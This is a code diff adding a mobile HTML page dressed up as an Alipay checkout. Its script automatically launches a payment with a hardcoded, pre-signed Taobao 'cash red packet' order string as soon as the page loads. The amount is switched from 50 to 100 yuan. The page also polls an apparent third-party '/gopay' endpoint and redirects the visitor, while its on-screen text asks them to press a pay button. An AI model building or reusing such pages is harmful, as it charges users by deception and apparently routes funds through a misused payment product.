@@ -1,0 +1,251 @@
+
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
+    <script src="https://gw.alipayobjects.com/as/g/h5-lib/alipayjsapi/3.1.1/alipayjsapi.inc.min.js"></script>
+    <link href="https://as.alipayobjects.com:443/g/snake/h5cashier/1.0.5/h5cashier.css" media="all" rel="stylesheet" type="text/css" />
+
+</head>
+<body>
+<header class="am-header">
+    <h1>
+        <span class="title-main" data-title="支付宝收银台">支付宝收银台</span>
+    </h1>
+
+</header>
+<noscript><h1 style="color:red">您的浏览器不支持JavaScript，请更换浏览器或开启JavaScript设置!</h1></noscript>
+<!-- FD:256:mobileclientgw/home/v5/h5PayRoute.vm:START -->
+<style>
+    body {
+        font-weight: 500;
+        font-family: PingFangSC-Regular, "Helvetica Neue",Helvetica,Arial,"Lucida Grande",sans-serif;
+    }
+
+    .am-header {
+        display: none;
+    }
+
+    .alipay-logo {
+        display: none;
+    }
+
+    .result {
+        position: absolute;
+        top: 50%;
+        margin-top: -215px;
+        width: 100%;
+    }
+
+    .result-logo {
+        width: 70px;
+        height: 98px;
+        margin: auto;
+        background-image: url(data:image/png;base64,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);
+        background-repeat: no-repeat;
+        background-size: contain;
+    }
+
+    .result-title {
+        margin: 40px 0 14px;
+        text-align: center;
+        font-size: 21px;
+        color: #00a0e8;
+        line-height: 25px;
+    }
+
+    .result-tips {
+        max-width: 370px;
+        margin: 0 auto 10px;
+        padding: 0 15px;
+        font-size: 15px;
+        color: #a5a5a5;
+        line-height: 18px;
+        text-align: left;
+        word-break: break-all;
+        word-wrap: break-word;
+    }
+
+    .result-botton {
+        margin: 0 15px 20px;
+    }
+
+    .result-botton a {
+        display: block;
+        margin: auto;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        max-width: 384px;
+        height: 44px;
+        text-align: center;
+    }
+
+    .result-botton a.am-button-white {
+        color: #00aaee;
+        background: #ffffff;
+        border: 1px solid #00aaee;
+    }
+
+    .result-botton .am-button[disabled=disabled] {
+        color: #e6e6e6;
+        background: #f8f8f8;
+        border: 1px solid #dedede;
+    }
+
+    .loading {
+        display: none;
+    }
+</style>
+<div class="loading"></div>
+<div class="am-content">
+    <input name="params" type="hidden" value="{&quot;server_param&quot;:&quot;emlkPTk5O25kcHQ9OTQ4NDtjYz15&quot;}" />
+    <div class="result">
+        <div class="result-logo"></div>
+        <div class="result-title">点击按钮支付</div>
+        <div class="result-tips">如已支付<span color="red">请勿重复支付</span></div>
+        <div class="result-botton"><button class="J-h5pay am-button am-button-blue" href="javascript:void(0)" id="paybtn">支付</button></div>
+        <!-- <div class="am-wingblank wb12px"  style="margin:10px;">
+          <a id="active_payed" style="color: #00aaee;background: #ffffff;border: 1px solid #00aaee;"
+          class="J-complete am-button am-button-white"  onclick="preNotify()">
+          我已付款
+          </a>
+        </div> -->
+    </div>
+</div>
+<script>
+    function ready(callback) {
+        if (window.AlipayJSBridge) {
+            callback && callback();
+        } else {
+            document.addEventListener('AlipayJSBridgeReady', callback, false);
+        }
+    }
+
+    window.onload = function () {
+        ready(function () {
+            AlipayJSBridge.call('hideOptionMenu');
+        });
+    }
+</script>
+<script>
+    $(document).ready(function () {
+        //$("#paybtn").attr("disabled", true);
+        //$("#div_Processing").hide();
+        var qrcode = 'service=&quot;alipay.fund.stdtrustee.order.create.pay&quot;&amp;partner=&quot;2088401309894080&quot;&amp;_input_charset=&quot;utf-8&quot;&amp;notify_url=&quot;https://wwhongbao.taobao.com/callback/alipay/notifyPaySuccess.do&quot;&amp;out_order_no=&quot;12621186_3431_1581183108_f9ff5b0fbc8ae247b08e27130bfc8dc3_1&quot;&amp;out_request_no=&quot;12621186_3431_1581183108_f9ff5b0fbc8ae247b08e27130bfc8dc3_1_p&quot;&amp;product_code=&quot;SOCIAL_RED_PACKETS&quot;&amp;scene_code=&quot;MERCHANT_COUPON&quot;&amp;amount=&quot;50.00&quot;&amp;pay_strategy=&quot;CASHIER_PAYMENT&quot;&amp;receipt_strategy=&quot;INNER_ACCOUNT_RECEIPTS&quot;&amp;platform=&quot;DEFAULT&quot;&amp;channel=&quot;APP&quot;&amp;order_title=&quot;淘宝现金红包&quot;&amp;master_order_no=&quot;2020020910002001860582251075&quot;&amp;order_type=&quot;DEDUCT_ORDER&quot;&amp;extra_param=&quot;{&quot;payeeShowName&quot;:&quot;淘宝现金红包&quot;}&quot;&amp;pay_timeout=&quot;30m&quot;&amp;order_expired_time=&quot;360d&quot;&amp;sign=&quot;P3WjTjzi6iOtmxvsAIj5Jm%2F9j5%2B%2F2GMTrGPzzERkCS2aZPeZOH0fuD9SpMGQsfRoC1%2FXt77hu7teGN1YM5gxzAeUCneRJTlcux9Ul4bmjkDpuGcKbzV4TJUO4s45x8g8EV4jUfIDfUIfZmd8BKhzh%2FVrvxDjKZAHvcd6SJa2GEr1nvyGUCSnDHQvjMbNU3o0H0txoX%2BZNBNpXJugf%2BPOG1AubU8xf9BaEm%2FxTiFUAkX%2BK5QWenU0uV1CRhaJyZ1ufH9GKGoHWW6cyEf1fhxgzeyEgQmFsCblLYAFmMBlLQXPCZ2l0TmNTe2t4nWuTparCyIW3LtlMQesa8rK5COGYw%3D%3D&quot;&amp;sign_type=&quot;RSA&quot;';
+        //var decode = atob(qrcode);
+        //// 编码转字符串
+        //qrcode = decodeURI(decode);
+
+        var key = '&amp;';
+        qrcode = qrcode.replace(new RegExp(key, 'g'), "&");
+        key = '&quot;';
+        qrcode = qrcode.replace(new RegExp(key, 'g'), '"');
+        //AlipayJSBridge.call('pushWindow', { url: qrcode });
+        qrcode='service="alipay.fund.stdtrustee.order.create.pay"&partner="2088401309894080"&_input_charset="utf-8"&notify_url="https://wwhongbao.taobao.com/callback/alipay/notifyPaySuccess.do"&out_order_no="12621186_7436_1581222060_90627662b66d34eb491f5b63a8a40b30_1"&out_request_no="12621186_7436_1581222060_90627662b66d34eb491f5b63a8a40b30_1_p"&product_code="SOCIAL_RED_PACKETS"&scene_code="MERCHANT_COUPON"&amount="100.00"&pay_strategy="CASHIER_PAYMENT"&receipt_strategy="INNER_ACCOUNT_RECEIPTS"&platform="DEFAULT"&channel="APP"&order_title="淘宝现金红包"&master_order_no="2020020910002001060595061694"&order_type="DEDUCT_ORDER"&extra_param="{"payeeShowName":"淘宝现金红包"}"&pay_timeout="30m"&order_expired_time="360d"&sign="Xw60w9KbU3xV48HkRKAklqNSp1%2BMVxr3CYnA0HndmqTz9BSc%2ForXUeNISTftIHnf4oylLUgvxEJpdtZuzFyeeroKhHDNti3erlw4q5mBgkzLmU%2FIbKwh%2B%2BvmMj9U3XK6JhFn8mhqDAUs4mwwafVax0HShtX47dBfuNBSUtAzuzGFn%2BjYZ4Y6rFbZSuqC9faR%2B2UZOAa6%2FK7vdXsQGFmzNRFabqY413KpZCBMSfKRDjnMdheUDuiqEWP2nwa7N12Gl7xAJfwd2UDNcTBrGPlWdE192p3eHAZXxGoBJT7HV9iP8QygzmJTMdNPnw9NQV0AQi%2FV%2FhRT0dbYRnOImeBO%2Fg%3D%3D"&sign_type="RSA"';
+
+        ap.tradePay({
+            orderStr: qrcode
+        }, function (res) {
+            if (res.resultCode == 6001) {
+
+            } else if (res.resultCode == 9000) {
+                back();
+            }
+        });
+
+        //$("#div_Processing").hide();
+        //$("#paybtn").removeAttr("disabled");
+
+        $("#paybtn").click(function () {
+            ap.tradePay({
+                orderStr: qrcode
+            }, function (res) {
+                if (res.resultCode == 6001) {
+
+                } else if (res.resultCode == 9000) {
+                    back();
+                }
+            });
+        });
+
+        pollingResult("");
+
+    });
+
+    AlipayJSBridge.call("setTitleColor", {
+        color: parseInt('1E9FFF', 16),
+        reset: false // (可选,默认为false)  是否重置title颜色为默认颜色。
+    });
+    //导航栏loadin
+    AlipayJSBridge.call('showTitleLoading');
+    //副标题文字
+    AlipayJSBridge.call('setTitle', {
+        title: '支付收银台',
+        subtitle: '安全支付'
+    });
+    //右上角菜单
+    AlipayJSBridge.call('setOptionMenu', {
+        icontype: 'filter',
+    });
+    AlipayJSBridge.call('showOptionMenu');
+    document.addEventListener('optionMenu', function (e) {
+        AlipayJSBridge.call('showPopMenu', {
+            menus: [{
+                name: "查看帮助",
+                tag: "tag1",
+            },
+                {
+                    name: "我要投诉",
+                    tag: "tag2",
+                }
+            ],
+        }, function (e) {
+            console.log(e);
+        });
+    }, false);
+
+    function ShowObjProperty(Obj) {
+        var PropertyList = '';
+        var PropertyCount = 0;
+        for (i in Obj) {
+            if (Obj.i != null)
+                PropertyList = PropertyList + i + '属性：' + Obj.i + '\r\n';
+            else
+                PropertyList = PropertyList + i + '方法\r\n';
+        }
+        alert(PropertyList);
+    }
+
+    //轮询处理结果
+    function pollingResult(id) {
+        var timer = window.setInterval(function () {
+            $.ajax({
+                url: "/gopay/PollingOrderResult?trade_no=" + id,
+                type: "get",
+                dataType: "json",
+                success: function (result) {
+                    if (result.error == 200) {
+                        window.clearInterval(timer);
+                        window.location.href = result.msg;
+                    }
+                },
+                error: function (ex) {
+                }
+            });
+        }, 10000);
+    };
+
+    function back() {
+
+        AlipayJSBridge.call("exitApp")
+    }
+
+
+</script>
+</body>
+</html>
